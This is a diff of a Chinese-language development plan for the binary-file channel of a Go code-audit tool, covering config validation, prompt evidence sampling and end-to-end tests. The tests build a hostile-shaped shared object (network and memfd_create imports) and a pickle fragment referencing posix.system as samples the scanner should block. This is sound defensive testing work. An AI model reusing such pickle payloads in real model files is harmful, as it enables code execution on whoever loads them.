+> - 这个缺口**不是二进制通道引入的**：源码文件路径一直如此。二进制 finding 仍逐条走 `VerifyReport` → `VerifyFinding` 送模型复核，阻断判定不依赖文件级小结，所以本任务的两个用例由 mock 驱动是诚实的测试，不是掩盖。
+> - 若将来要真正打通，第一条路（扩协议）是正解；而按 finding 级已实测的先例，届时文件级提示词也该照那条先例的完整形态重组（准则前置 **并** 尾部重述）。
+
+> **注（提示词结构，不改行为）**：`binaryFileAnalysisPromptTemplate` 把 `## 判定基准` 放在**证据块之后**且没有尾部重述。这与仓库已实测的 **finding 级**先例不一致——`teellm/ollama_backend.go:15` 的 `findingAnalysisPromptTemplate` 是**准则前置**（`## 判定优先级与安全边界` 在第 17 行、证据之前）**加尾部** `## 判定提醒`（第 46 行），由 `TestFindingAnalysisPromptOrderAndVerbs`/`TestFindingAnalysisPromptCachingInvariants`（`teellm/ollama_backend_test.go:443`/`:536`）钉住——但它与自己的**文件级**同类 `fileAnalysisPromptTemplate`（`internal/codeaudit/verifier.go:300-317`，同样是准则在证据之后、无尾部重述）一致，所以本任务**保持现状不重组**：那条实测覆盖的是 finding 级提示词，没有任何针对文件级提示词的测量，而在上一条注成立的前提下它今天也到不了模型。留这条注记只为给后来者一个杠杆——**若将来要优化文件级提示词的延迟，第一个该试的杠杆是把准则前置**（与 finding 级先例同形），而且必须照那条先例的**完整形态**做：前置**并**在尾部重述，因为那条先例记录的是"只前置、无尾部重述会系统性转严"。
+
+> **已决（2026-10-13，用户裁定）：证据节选改为按来源取样，放弃 `Render` 的前缀截断。** 计划原定的 `ev.Render(binaryFilePromptMaxLines)` 取的是**前缀**，而 `Finalize`（`internal/codeaudit/binary_evidence.go:396`）的排序键是 `(Offset, Source, Text)`：所有结构性证据经 `addStructured`（`:211`）落盘时 `Offset` 都是 0，offset 相同时比较器落到**来源名字典序**，于是 offset 0 内的次序是 dynsym → entropy → member → needed → notice → pickle → section。dynsym 每有一个 `SHN_UNDEF`+`STB_GLOBAL` 动态符号就产出一行（`:860-865`）且**没有逐来源上限**，所以符号密集的库会把 120 行预算整段吃掉。**实测**（判据即提取器自己的过滤条件 `SHN_UNDEF` **且** `STB_GLOBAL`，`readelf -sW --dyn-syms /usr/lib/x86_64-linux-gnu/libstdc++.so.6 | awk '$7=="UND" && $5=="GLOBAL"' | wc -l`）：**189** 个这样的符号，单独就超过上限。（把条件放宽成"所有 UND 符号"会得到 202——那是把 WEAK 等其它 bind 也算进去了，不是提取器的口径，别拿这个数当依据。）在该形状的 fixture 上 `Render(120)` 的产出是 `dynsym:120`，entropy/section/needed 各 0 行。后果恰是提示词自己 `## 判定基准` 第 2 条（可执行节区加壳、DT_NEEDED 外联库）所要的证据一行都进不去——所以计划里那句"排序把结构性证据放在清单最前"只对 offset 0 这个**大类**成立，对该类内部的次序不成立，那句话已从代码注释里删掉。
+>
+> 改法：新增 `(*EvidenceSet).RenderExcerpt`（`binary_evidence.go`），先按索引序输出**保留来源**（entropy / section / needed / notice——行数由文件的**结构**决定，不由内容体量决定），再用剩余预算按索引序补足其余来源；逐行格式抽到 `appendEvidenceLine`（`:415`）一处，两个渲染器不会漂移。**索引仍取自 `Finalize`**，所以"模型点到的行就是报告里的行"这一不变式不动（节选内索引因此不连续，这是预期而非缺陷）。同一 fixture 换成 `RenderExcerpt(120)` 后产出 `dynsym:112, section:6, entropy:1, needed:1`。取样契约由新增的 `TestBinaryFilePromptExcerptKeepsStructuralEvidenceUnderSymbolFlood` 钉住，其 fixture 的 import 数量由 `binaryFilePromptMaxLines` 推导而非写死，常量改大时该测试不会悄悄失去判别力。
+>
+> **`Finalize` 的比较器与契约未动**：给 offset 0 内的来源定优先级是另一条候选路，被否决——`Finalize` 的顺序是 `Finding.Line` 索引所依赖的既有契约，改它会波及上一批任务已复核的排序测试，并可能改变既有 finding 的行号。因为改写后 `Render` 已无调用方（`RenderExcerpt` 在保留集为空时即等价的纯前缀），已将其删除，方法名不再存在于树中。
+
+- [ ] **Step 6: 跑测试确认通过**
 
 ```bash
 go test ./internal/codeaudit/ -run 'TestBinaryFilePrompt|TestSourceFilePrompt|TestGenerateAuditReport' -v 2>&1 | tail -20
@@ -4737,7 +10040,7 @@ go test ./internal/codeaudit/ -run 'TestBinaryFilePrompt|TestSourceFilePrompt|Te
 
 预期全 PASS。
 
-- [ ] **Step 6: 提交**
+- [ ] **Step 7: 提交**
 
 ```bash
 gofmt -l internal/codeaudit/ ; go vet ./internal/codeaudit/
@@ -4757,13 +10060,16 @@ git commit -m "feat(audit): give binary files their own file-level audit prompt"
 
 追加到 `internal/config/config_test.go`：
 
+> `writeTestConfig` 的签名是 `func writeTestConfig(t *testing.T, path, content string)`——**没有返回值**，它把内容写到 `path`。所以每一处都按文件里既有调用点的写法来：先 `path := filepath.Join(t.TempDir(), DefaultFileName)`，再 `writeTestConfig(t, path, ...)`。`filepath` 与 `DefaultFileName` 在 `config_test.go` 里都已可用。
+
 ```go
 // TestBinaryAuditConfigDefaultsAndOverrides pins the switch that makes this
 // feature reversible: the channel is on unless a deployment says otherwise, and
 // every limit can be moved without touching code.
 func TestBinaryAuditConfigDefaultsAndOverrides(t *testing.T) {
 	t.Run("absent means enabled with the adapter's defaults", func(t *testing.T) {
-		path := writeTestConfig(t, t.TempDir(), `{"security":{"codeScanEngine":"regex"}}`)
+		path := filepath.Join(t.TempDir(), DefaultFileName)
+		writeTestConfig(t, path, `{"security":{"codeScanEngine":"regex"}}`)
 		cfg, err := LoadStartupConfig(path)
 		if err != nil {
 			t.Fatalf("LoadStartupConfig: %v", err)
@@ -4778,7 +10084,8 @@ func TestBinaryAuditConfigDefaultsAndOverrides(t *testing.T) {
 	})
 
 	t.Run("an explicit false disables it", func(t *testing.T) {
-		path := writeTestConfig(t, t.TempDir(), `{"security":{"binaryAudit":{"enabled":false}}}`)
+		path := filepath.Join(t.TempDir(), DefaultFileName)
+		writeTestConfig(t, path, `{"security":{"binaryAudit":{"enabled":false}}}`)
 		cfg, err := LoadStartupConfig(path)
 		if err != nil {
 			t.Fatalf("LoadStartupConfig: %v", err)
@@ -4789,7 +10096,8 @@ func TestBinaryAuditConfigDefaultsAndOverrides(t *testing.T) {
 	})
 
 	t.Run("limits are read", func(t *testing.T) {
-		path := writeTestConfig(t, t.TempDir(),
+		path := filepath.Join(t.TempDir(), DefaultFileName)
+		writeTestConfig(t, path,
 			`{"security":{"binaryAudit":{"maxArchiveMembers":17,"highEntropyThreshold":7.25}}}`)
 		cfg, err := LoadStartupConfig(path)
 		if err != nil {
@@ -4804,14 +10112,21 @@ func TestBinaryAuditConfigDefaultsAndOverrides(t *testing.T) {
 	})
 
 	t.Run("a negative limit is rejected rather than read as a default", func(t *testing.T) {
-		path := writeTestConfig(t, t.TempDir(), `{"security":{"binaryAudit":{"maxArchiveMembers":-1}}}`)
+		// The guarantee is the load path's: LoadStartupConfig runs
+		// validateStartupConfig before anything reads the value, so a negative
+		// never reaches the normalizer. codeaudit's own normalizer tests "<= 0",
+		// so a negative arriving by any other route - a hand-built StartupConfig -
+		// would be replaced by the default instead of rejected.
+		path := filepath.Join(t.TempDir(), DefaultFileName)
+		writeTestConfig(t, path, `{"security":{"binaryAudit":{"maxArchiveMembers":-1}}}`)
 		if _, err := LoadStartupConfig(path); err == nil {
 			t.Error("a negative limit was accepted; it would be normalised to the default and the operator would never know")
 		}
 	})
 
 	t.Run("the full-scan threshold is carried through", func(t *testing.T) {
-		path := writeTestConfig(t, t.TempDir(), `{"security":{"binaryAudit":{"maxFullScanBytes":134217728}}}`)
+		path := filepath.Join(t.TempDir(), DefaultFileName)
+		writeTestConfig(t, path, `{"security":{"binaryAudit":{"maxFullScanBytes":134217728}}}`)
 		cfg, err := LoadStartupConfig(path)
 		if err != nil {
 			t.Fatalf("LoadStartupConfig: %v", err)
@@ -4823,18 +10138,33 @@ func TestBinaryAuditConfigDefaultsAndOverrides(t *testing.T) {
 }
 ```
 
-追加到 `internal/app/taa/app_test.go`（在 `TestBuildSecurityConfig` 末尾的断言之后）：
+追加到 `internal/app/taa/app_test.go`。
+
+**先**在 `TestBuildSecurityConfig` 的 `cfg := config.StartupConfig{...}` 字面量里补两个字段——这个测试是手工构造字面量、绕过了配置加载器，所以 `BinaryAuditEnabled` 不会自动为真，而 `BinaryAuditMaxArchiveMembers` 会停在 0：
+
+```go
+		BinaryAuditEnabled:           true,
+		BinaryAuditMaxArchiveMembers: 17,
+```
+
+**再**在该测试末尾的断言之后追加：
 
 ```go
 	// The binary channel's configuration is carried through rather than dropped:
 	// a value that reaches the config struct and not the controller is a setting
 	// an operator can write and cannot observe.
+	//
+	// The comparison is against the raw config value, not the resolved one. "0
+	// means use the codeaudit default" resolves in exactly one place - the
+	// codeaudit normalizer every extraction path already calls - and a second
+	// resolver here would be a second place for the two to disagree about what
+	// the default is. The resolution itself is proven at the codeaudit level.
 	if !sec.Binary.Enabled {
-		t.Error("SecurityConfig.Binary.Enabled = false, want the default of true")
+		t.Error("SecurityConfig.Binary.Enabled = false, want the value carried from BinaryAuditEnabled")
 	}
-	if sec.Binary.MaxArchiveMembers != codeaudit.DefaultBinaryConfig().MaxArchiveMembers {
-		t.Errorf("SecurityConfig.Binary.MaxArchiveMembers = %d, want the codeaudit default %d",
-			sec.Binary.MaxArchiveMembers, codeaudit.DefaultBinaryConfig().MaxArchiveMembers)
+	if sec.Binary.MaxArchiveMembers != cfg.BinaryAuditMaxArchiveMembers {
+		t.Errorf("SecurityConfig.Binary.MaxArchiveMembers = %d, want the raw config value %d",
+			sec.Binary.MaxArchiveMembers, cfg.BinaryAuditMaxArchiveMembers)
 	}
 ```
 
@@ -4863,8 +10193,11 @@ go test ./internal/config/ -run TestBinaryAuditConfig 2>&1 | head -10
 	// BinaryAuditHighEntropyThreshold is the bits-per-byte above which an
 	// executable section is called packed. Zero means the codeaudit default.
 	BinaryAuditHighEntropyThreshold float64
-	// BinaryAuditMaxFindings bounds findings from the binary pass. Zero means the
-	// codeaudit default.
+	// BinaryAuditMaxFindings is the listing budget for the binary pass, not a
+	// completeness bound: reaching it drops LOW findings (and only LOW - HIGH and
+	// MEDIUM can block the import and are always kept) and is recorded as
+	// findings_capped, and it never withholds a pass. Zero means the codeaudit
+	// default.
 	BinaryAuditMaxFindings int
 	// BinaryAuditMaxFullScanBytes is the size above which a file is read at its
 	// two ends instead of end to end. Zero means the codeaudit default. It is
@@ -4872,6 +10205,17 @@ go test ./internal/config/ -run TestBinaryAuditConfig 2>&1 | head -10
 	// depends on the deployment's package sizes: raising it buys a complete pass
 	// over a large pickle at a cost of about 3 microseconds per kibibyte.
 	BinaryAuditMaxFullScanBytes int
+	// BinaryAuditMaxStreamBytes bounds how much of one file the end-to-end
+	// streaming pass reads. Zero means the codeaudit default (3 GiB).
+	//
+	// It is exposed because it is the twin of MaxFullScanBytes: the stream budget
+	// is only reachable by a file that MaxFullScanBytes let through, so an
+	// operator who raises MaxFullScanBytes past the stream ceiling makes the
+	// stream ceiling bind - and its breach records a structural bound, which on
+	// an executable kind blocks the import. Leaving it fixed while its twin is
+	// exposed would turn that into an unactionable block. Two keys that move
+	// together, in the same block and the same validation.
+	BinaryAuditMaxStreamBytes int
 ```
 
 `startupSecurityConfigFile` 在 `SemgrepTimeoutSeconds` 之后追加：
@@ -4885,24 +10229,31 @@ go test ./internal/config/ -run TestBinaryAuditConfig 2>&1 | head -10
 ```go
 // startupBinaryAuditConfigFile is the security.binaryAudit block.
 //
-// Every limit is a pointer so that "absent" and "zero" stay distinguishable: a
-// zero the operator wrote is a limit of zero and is rejected below, while an
-// absent field means "use the codeaudit default". Reading both as zero would
-// turn a deliberate 0 into a silently substituted default.
+// Enabled is a pointer because "absent" and "false" must not collapse: the
+// channel defaults on, so an absent field read as false would turn silence into
+// a rollback. The limits are pointers too, but only this layer gets a
+// distinction out of it - validateBinaryAudit rejects a negative and lets zero
+// through, and a zero then resolves to the codeaudit default through
+// normalizeBinaryConfig exactly as an absent field does. A deliberate 0 is
+// therefore not rejected; it is read as "use the default", which is the same
+// thing the field says when it is missing.
 type startupBinaryAuditConfigFile struct {
 	Enabled              *bool    `json:"enabled"`
 	MaxArchiveMembers    *int     `json:"maxArchiveMembers"`
 	HighEntropyThreshold *float64 `json:"highEntropyThreshold"`
 	MaxFindings          *int     `json:"maxFindings"`
 	MaxFullScanBytes     *int64   `json:"maxFullScanBytes"`
+	MaxStreamBytes       *int64   `json:"maxStreamBytes"`
 }
 ```
 
-在 `validateCodeScanEngine` 调用点附近（`LoadStartupConfig` 内的校验序列中）追加：
+> 更正（2026-10-13，规格审查发现）：上面这段注释原文写的是「操作者写的 0 会在下面被拒」，与同一段规格里的 `validateBinaryAudit` 矛盾——后者只拒**负数**。显式 0 能通过校验，随后被 `normalizeBinaryConfig`（`internal/codeaudit/binary_evidence.go:592`，十个闸门全是 `<= 0`）解析成默认值，与字段缺失时**同一条路径**。也就是说指针在这层之外的区分并不留存。已按实际行为改写，实现按改写后的文本落地（`69815fc` 之后的注释修正提交）。
+
+在 `validateCodeScanEngine` 的**调用者**——`validateStartupConfig`（`internal/config/config.go:236`）——的校验序列里追加（`LoadStartupConfig` 只是调 `validateStartupConfig`，本身没有校验序列）：
 
 ```go
 	if err := validateBinaryAudit(cfg); err != nil {
-		return StartupConfig{}, err
+		return err
 	}
 ```
 
@@ -4913,8 +10264,17 @@ type startupBinaryAuditConfigFile struct {
 //
 // A negative count is rejected rather than normalised: the normalisation path
 // exists for "unset", and a deployment that wrote -1 has a different problem
-// from one that wrote nothing. Rejecting at load time turns it into a startup
-// error instead of an audit that quietly ran with a different budget.
+// from one that wrote nothing. Rejecting turns it into a startup error instead
+// of an audit that quietly ran with a different budget.
+//
+// The guarantee is path-specific, and worth stating precisely: it holds on the
+// file-load path, because validateStartupConfig runs before the values are used.
+// It does not hold globally. normalizeBinaryConfig tests "<= 0", so a negative
+// that reaches codeaudit by another route - a hand-built StartupConfig, which is
+// exactly how buildSecurityConfig is called from the app tests - is silently
+// replaced by the default rather than rejected. Nothing reaches that route in
+// production: the only production construction of StartupConfig goes through
+// LoadStartupConfig.
 func validateBinaryAudit(cfg StartupConfig) error {
 	if cfg.BinaryAuditMaxArchiveMembers < 0 {
 		return fmt.Errorf("security.binaryAudit.maxArchiveMembers must not be negative, got %d", cfg.BinaryAuditMaxArchiveMembers)
@@ -4925,6 +10285,9 @@ func validateBinaryAudit(cfg StartupConfig) error {
 	if cfg.BinaryAuditMaxFullScanBytes < 0 {
 		return fmt.Errorf("security.binaryAudit.maxFullScanBytes must not be negative, got %d", cfg.BinaryAuditMaxFullScanBytes)
 	}
+	if cfg.BinaryAuditMaxStreamBytes < 0 {
+		return fmt.Errorf("security.binaryAudit.maxStreamBytes must not be negative, got %d", cfg.BinaryAuditMaxStreamBytes)
+	}
 	if cfg.BinaryAuditHighEntropyThreshold < 0 || cfg.BinaryAuditHighEntropyThreshold > 8 {
 		return fmt.Errorf("security.binaryAudit.highEntropyThreshold must be within [0,8] bits per byte, got %v",
 			cfg.BinaryAuditHighEntropyThreshold)
@@ -4933,11 +10296,13 @@ func validateBinaryAudit(cfg StartupConfig) error {
 }
 ```
 
-在 `DefaultStartupConfig` 的返回值里，`CodeScanEngine: "semgrep",` 之后追加：
+在 `defaultStartupConfig()`（`internal/config/config.go:305`；注意它**未导出**，不存在 `DefaultStartupConfig` 这个符号）的返回值里，`CodeScanEngine: "semgrep",` 之后追加：
 
 ```go
 		BinaryAuditEnabled: true,
 ```
+
+> 这一行是**唯一**让通道默认开着的东西，原因值得写下来：`BinaryConfig.Enabled` 是 `normalizeBinaryConfig` **唯一不填默认值**的字段，因为它填不了——Go 里显式的 `false` 与零值无法区分，把零值当默认就等于让「显式关掉」永远无法生效。所以任何绕过 `defaultStartupConfig`、直接构造 `codeaudit.AuditConfig{LLM: cfg}` 而把 `Binary` 留成零值的调用方，拿到的是**关着的**通道，而不是一组默认值。生产的构造路径只有 `LoadStartupConfig → applyStartupConfigFile → defaultStartupConfig` 一条，这一行在真实启动路径上承重。
 
 在文件配置覆盖段（`if trimmed := strings.ToLower(strings.TrimSpace(fileCfg.Security.CodeScanEngine)); trimmed != ""` 附近）追加：
 
@@ -4957,6 +10322,9 @@ func validateBinaryAudit(cfg StartupConfig) error {
 	if ba := fileCfg.Security.BinaryAudit; ba.MaxFullScanBytes != nil {
 		cfg.BinaryAuditMaxFullScanBytes = int(*ba.MaxFullScanBytes)
 	}
+	if ba := fileCfg.Security.BinaryAudit; ba.MaxStreamBytes != nil {
+		cfg.BinaryAuditMaxStreamBytes = int(*ba.MaxStreamBytes)
+	}
 ```
 
 - [ ] **Step 4: 装配到 controller**
@@ -4975,6 +10343,7 @@ func validateBinaryAudit(cfg StartupConfig) error {
 			MaxArchiveMembers:    cfg.BinaryAuditMaxArchiveMembers,
 			MaxFindings:          cfg.BinaryAuditMaxFindings,
 			MaxFullScanBytes:     int64(cfg.BinaryAuditMaxFullScanBytes),
+			MaxStreamBytes:       int64(cfg.BinaryAuditMaxStreamBytes),
 			HighEntropyThreshold: cfg.BinaryAuditHighEntropyThreshold,
 		},
 ```
@@ -5011,6 +10380,19 @@ git add internal/config/ internal/app/ internal/controller/ configs/
 git commit -m "feat(config): expose the binary audit channel through security.binaryAudit"
 ```
 
+> **门禁判据：`gofmt -l internal/` 要先与基线比，别把既有文件当成自己的错。** HEAD 上这条命令本来就会列出 **11** 个未格式化文件，而且**其中两个正是本步要编辑的**：`internal/app/taa/app.go` 与 `internal/app/taa/app_test.go`（`gofmt -d` 显示是既有的 LLM 字面量对齐，不是本计划引入的）。其余九个是 `internal/codeaudit/audit.go`、`internal/codeaudit/llm.go`、`internal/codeaudit/result_checker.go`、`internal/controller/attestation_format.go`、`internal/controller/report_model_import_test.go`、`internal/controller/report_res_test.go`、`internal/platform/client_test.go`、`internal/resource/archive.go`、`internal/resource/envelope.go`。所以判据是**列表的增量**：只有出现本次新写/新改、且**在基线列表之外**的文件才是你的问题；出现在基线里的那些一律不是。（Task 11 那条只覆盖 `internal/codeaudit/` 的同类陷阱是它的子集。）**严禁 `gofmt -w`**——它会把既有文件一并重排，制造与本次改动无关的 diff。
+
+> **质量审查后的修正（2026-10-13）**：Task 14 的代码质量审查提出 10 条，三条改了代码或测试（`ead3cd5`、`167e513`、`794f721`）。
+>
+> 1. **`streamWithSizeSwitch` 只按大小记结构性边界——真缺陷，已修（`ead3cd5`）**。原实现 `if set.Size > cfg.MaxFullScanBytes` 就 `markStructural`，从不判断两个 `HeadTailBytes` 窗口是否真的留下未读中段。默认配置（64 MiB 阈值、1 MiB 窗口）下不可能触发——越过 64 MiB 必然也越过 2 MiB——但**本任务刚把这个旋钮交给运维**：一旦 `maxFullScanBytes` 调到 2 MiB 以下，一个被两个窗口**整份覆盖**的文件会被记成 windowed，理由串还写着"只读了首尾 N 字节"，而 `KindELF`/`KindArchive`/`KindPickle`/`KindCompressed` 都是可执行类型，于是 `ProvesCleanScan()` 为假、这次导入被拒——为一份什么都没漏掉的文件、用一句与事实相反的理由。改为仅当 `set.Size > 2*cfg.HeadTailBytes` 时才记录。回归测试 `TestStreamWithSizeSwitchRecordsNoBoundWhenTheWindowsCoverTheFile`（`fullScan=64`、`window=4096`、8192 字节，正好被两窗口铺满）钉住；**变异证明**：把条件改回 `if true`，该测试失败并打印出那句假理由。既有的 `TestStreamWithSizeSwitchWindowsAFileAboveTheFullScanBudget` 不受影响（`fullScan=4096`、`window=64`，8192 字节远在 128 之上）。
+> 2. **注释与事实不符，已改（`167e513`）**：`startupBinaryAuditConfigFile` 的指针理由（原写"操作者写的 0 会被拒"，见上文更正条）、`BinaryAuditMaxStreamBytes` 的"同一处校验、两个键一起动"（**没有任何跨字段校验**，改成写清运维必须自己保证什么）、`BinaryAuditHighEntropyThreshold` 未说明区间两端的行为（8.0 使该族静默失效；阈值落进编译代码本身所在的区间——约 6.0–6.5——时，正常的共享库开始被判成加壳，而 `BIN_001` 是 HIGH，两种策略下都阻断；**"每个 `.so` 都被判加壳"是错的**：判定是"熵 > 阈值"，实测本树三个真实 `.so` 的可执行节熵为 6.21/6.00/6.22，阈值取 6.5 时一个都不命中）、以及 `SecurityConfig.Binary` 的零值语义（见下条）。
+> 3. **测试判别力不足，已补（`794f721`）**：`validateBinaryAudit` 的六个分支原本只驱动了一个，`TestBuildSecurityConfig` 六个字段原本只比了两个。现改为表驱动覆盖全部六分支（四个负数 + 阈值 `-0.5`/`8.5`）、六个字段各取互不相同的值、并把开关的两个方向都验——只验 true 时，把 `Enabled` 硬编码成 `true` 仍能通过，而那正是这处接线唯一会"看着对却是坏的"方式。**变异证明**：削弱两个校验分支后 config 测试失败；把 `Enabled` 硬编码为 `true`、`MaxFindings` 置 0 后 app 测试失败。
+> 4. **`app_test.go` 的 gofmt 增量（已处理）**：新增字段加宽了那个复合字面量的对齐列，使该文件的 `gofmt -d` hunk 从基线的 1 个变成 2 个。已把字面量按 gofmt 对齐（同时保留既有那条 import 顺序 hunk 不动），hunk 数回到 1，`gofmt -l` 列表与基线逐项一致。
+>
+> 记录但**未改**（属产品决策或超出本任务范围，留待最终评审）：`maxStreamBytes < maxFullScanBytes` 无校验（夹在两者之间大小的文件会全部记边界，在可执行类型上阻断导入）；`highEntropyThreshold` 接受整个 `[0,8]`；启动日志不打印二进制通道的开关与限值；`BinaryAuditMaxFullScanBytes`/`MaxStreamBytes` 用 `int` 而同结构体里同类字节数用 `int64`（只在 32 位目标上会截断 3 GiB，当前目标不涉及）。
+>
+> 另有一条**既成事实、刻意不回退**：`SecurityConfig.Binary` 的零值就是"关闭"。Task 12 之前 `import_processing.go` 硬编码 `codeaudit.DefaultBinaryConfig()`，所以控制器测试一直在通道开启下跑；换成 `s.Security.Binary` 后，凡是没有显式设置该字段的 `SecurityConfig`（如 `handler_test.go` 的 `setupTestState`）都变成通道关闭。控制器测试里**没有一条**断言二进制通道（`grep -n "Binary" internal/controller/*_test.go` 无命中），所以没有断言丢失，变的是执行覆盖而非验证强度；生产路径只有一个构造点（`buildSecurityConfig`）且总是设置该字段，已在 `SecurityConfig` 的文档注释里写明这个陷阱。
+
 ---
 
 ### Task 15: 端到端、文档与验收
@@ -5028,37 +10410,46 @@ package codeaudit
 
 import (
 	"context"
+	"sort"
 	"strings"
 	"testing"
 )
+
+// endToEndConfig is the audit configuration the integration tests share: Tier 1
+// only, so a verdict comes from the matchers rather than from a model.
+func endToEndConfig(policy string) AuditConfig {
+	return AuditConfig{
+		LLM:    LLMConfig{Enabled: false, Policy: policy},
+		Binary: DefaultBinaryConfig(),
+	}
+}
 
 // TestEndToEndMaliciousPackageIsBlocked walks the whole pipeline on a package
 // shaped like the ones this feature exists for: ordinary training code, a shared
 // object that reaches out, and a checkpoint whose pickle stream executes on load.
 //
-// Every one of the three parts is load-bearing. The source file proves the
-// channel did not replace the source engines; the shared object proves the
-// dynamic symbol evidence reaches the verdict; the checkpoint proves the
-// container recursion does. A pass that got the verdict right by another route
-// would still fail this test on the per-file assertions.
+// The verdict here is over-determined, and the assertions are written knowing
+// that: the shared object alone carries four HIGH findings (a packed executable
+// section, plus the corroborated presence families), so the pass stays withheld
+// even if the checkpoint's arm went silent. What pins each arm is its per-file
+// assertion, not the conclusion - drop the container recursion and PKL_001
+// disappears from the checkpoint while CRITICAL survives on the strength of the
+// shared object. train.py carries no assertion at all: it is here because a real
+// package has source next to its binaries, and it produces no finding either way.
 func TestEndToEndMaliciousPackageIsBlocked(t *testing.T) {
 	dir := t.TempDir()
 	writeTestFile(t, dir, "train.py", "import torch\n\ndef train():\n    return 1\n")
 	writeTestBytes(t, dir, "native/libevil.so", elfFixtureBytes(t, elfSpec{
-		imports: []string{"socket", "connect", "memfd_create"},
-		needed:  []string{"libcurl.so.4"},
-		text:    uniformBytes(512),
+		imports:  []string{"socket", "connect", "memfd_create"},
+		needed:   []string{"libcurl.so.4"},
+		text:     uniformBytes(512),
 		textExec: true,
 	}))
 	writeTestBytes(t, dir, "checkpoint.pt", zipFixture(t, map[string][]byte{
 		"archive/data.pkl": []byte("\x80\x04cposix\nsystem\n."),
 	}, []string{"archive/data.pkl"}))
 
-	cfg := AuditConfig{
-		LLM:    LLMConfig{Enabled: false, Policy: "assist"},
-		Binary: DefaultBinaryConfig(),
-	}
-	audit, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), cfg, nil)
+	audit, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), endToEndConfig("assist"), nil)
 	if err != nil {
 		t.Fatalf("GenerateAuditReport: %v", err)
 	}
@@ -5071,27 +10462,52 @@ func TestEndToEndMaliciousPackageIsBlocked(t *testing.T) {
 		t.Errorf("RiskLevel = %s, want CRITICAL", audit.Conclusion.RiskLevel)
 	}
 
-	byFile := map[string][]string{}
-	for _, fr := range audit.FileReports {
-		for _, f := range fr.Findings {
-			byFile[f.File] = append(byFile[f.File], f.RuleID)
-		}
-	}
-	assertHasRule(t, byFile, "native/libevil.so", "NET_002")
-	assertHasRule(t, byFile, "native/libevil.so", "BIN_002")
+	byFile := rulesByFile(audit)
 	assertHasRule(t, byFile, "checkpoint.pt", "PKL_001")
 
-	if audit.ScanMetadata.Binary == nil {
-		t.Fatal("ScanMetadata.Binary is nil")
+	// Severity, not just presence, is what pins each arm's weight. The verdict
+	// alone cannot: it is over-determined, so demoting any one arm leaves it
+	// CRITICAL on the strength of the others. Asserting the tier each finding
+	// lands in is what makes the entropy family, the corroborated presence
+	// families and the pickle target each individually load-bearing.
+	//
+	// The presence families are the interesting half. This file packs its own
+	// executable section, which is exactly the independent corroboration the gate
+	// waits for, so they must stay at their rule's HIGH. A gate that downgraded
+	// everything - or one whose corroboration lookup never matched - would leave
+	// the import blocked for the wrong reason and every other assertion green.
+	for _, rule := range []string{"BIN_001", "NET_002", "BIN_002"} {
+		f, ok := endToEndFinding(audit, "native/libevil.so", rule)
+		if !ok {
+			t.Fatalf("no %s finding for native/libevil.so; findings: %s", rule, dumpFindings(audit))
+		}
+		if f.Severity != "HIGH" {
+			t.Errorf("%s severity = %s, want HIGH: native/libevil.so carries a high-entropy executable section, "+
+				"which is both the packing measurement and the corroboration these families report HIGH on", rule, f.Severity)
+		}
+		if f.DowngradeReason != "" {
+			t.Errorf("%s carries a downgrade reason (%q) in a file that corroborates it", rule, f.DowngradeReason)
+		}
 	}
-	if got := audit.ScanMetadata.Binary.Kinds[string(KindELF)]; got != 1 {
+	pkl, ok := endToEndFinding(audit, "checkpoint.pt", "PKL_001")
+	if !ok {
+		t.Fatalf("no PKL_001 finding for checkpoint.pt; findings: %s", dumpFindings(audit))
+	}
+	if pkl.Severity != "HIGH" {
+		t.Errorf("PKL_001 severity = %s, want HIGH: a pickle target that resolves to posix.system is on its own "+
+			"enough to refuse the import, and at any lower tier this test stops proving the container recursion reaches the verdict",
+			pkl.Severity)
+	}
+
+	summary := binarySummary(t, audit)
+	if got := summary.Kinds[string(KindELF)]; got != 1 {
 		t.Errorf("Binary.Kinds[elf] = %d, want 1", got)
 	}
-	if got := audit.ScanMetadata.Binary.Kinds[string(KindArchive)]; got != 1 {
+	if got := summary.Kinds[string(KindArchive)]; got != 1 {
 		t.Errorf("Binary.Kinds[archive] = %d, want 1", got)
 	}
-	if audit.ScanMetadata.Binary.FilesCount != 2 {
-		t.Errorf("Binary.FilesCount = %d, want 2 (the .so and the .pt; train.py is text)", audit.ScanMetadata.Binary.FilesCount)
+	if summary.FilesCount != 2 {
+		t.Errorf("Binary.FilesCount = %d, want 2 (the .so and the .pt; train.py is text)", summary.FilesCount)
 	}
 }
 
@@ -5099,11 +10515,18 @@ func TestEndToEndMaliciousPackageIsBlocked(t *testing.T) {
 // whether the feature is usable. A model package is mostly weights, framework
 // imports and ordinary code; if any of those produced a blocking finding the
 // channel would be turned off in a week.
+//
+// It asserts the absence of findings that can block rather than the absence of
+// findings, which is what the channel promises and all it promises: the string
+// families are LOW by design and do reach the report, so a package full of
+// ordinary strings is expected to carry them.
 func TestEndToEndCleanPackageStillPasses(t *testing.T) {
 	dir := t.TempDir()
 	writeTestFile(t, dir, "train.py", "import torch\n\ndef train():\n    return 1\n")
 	// A shared object with the imports an accelerated kernel actually has, plus a
 	// tensor blob that is near-random by nature and must not read as packed code.
+	// Neither import here matches a presence pattern, so this fixture does not
+	// exercise the corroboration gate - see the gate's own test below.
 	writeTestBytes(t, dir, "native/libkernel.so", elfFixtureBytes(t, elfSpec{
 		imports: []string{"malloc", "memcpy", "pthread_create", "cblas_sgemm"},
 		needed:  []string{"libc.so.6", "libm.so.6", "libgomp.so.1"},
@@ -5111,25 +10534,96 @@ func TestEndToEndCleanPackageStillPasses(t *testing.T) {
 	}))
 	writeTestBytes(t, dir, "weights.safetensors", uniformBytes(4096))
 
-	cfg := AuditConfig{
-		LLM:    LLMConfig{Enabled: false, Policy: "assist"},
-		Binary: DefaultBinaryConfig(),
-	}
-	audit, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), cfg, nil)
+	audit, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), endToEndConfig("assist"), nil)
 	if err != nil {
 		t.Fatalf("GenerateAuditReport: %v", err)
 	}
 	if !audit.Conclusion.Passed {
 		t.Fatalf("a clean package was blocked; findings: %s", dumpFindings(audit))
 	}
-	if audit.ScanMetadata.Binary.FilesCount != 2 {
-		t.Errorf("Binary.FilesCount = %d, want 2", audit.ScanMetadata.Binary.FilesCount)
+	for _, fr := range audit.FileReports {
+		for _, f := range fr.Findings {
+			if f.Severity == "HIGH" || f.Severity == "MEDIUM" {
+				t.Errorf("%s was reported %s by %s, which blocks under gate and under assist; "+
+					"a near-random tensor blob and a kernel's ordinary imports must not reach that tier",
+					f.File, f.Severity, f.RuleID)
